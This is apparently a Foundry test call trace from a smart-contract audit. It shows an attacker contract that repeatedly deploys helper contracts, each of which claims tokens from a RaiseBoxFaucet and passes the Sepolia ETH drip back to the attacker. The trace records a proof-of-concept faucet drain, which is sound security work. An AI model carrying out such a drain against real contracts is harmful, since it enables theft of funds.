RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 605000000000000000 [6.05e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x48526Bb4D49c8C078BdC8e0C7c3F9Aa95C452f26
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 79) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2056772] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2056013] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2019845] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2012187] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 600000000000000000 [6e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xf7Df3e18d5e7eA062B052457D6FaBcDBE853c4D8
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 80) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1754803] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1754044] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1717876] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1710218] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
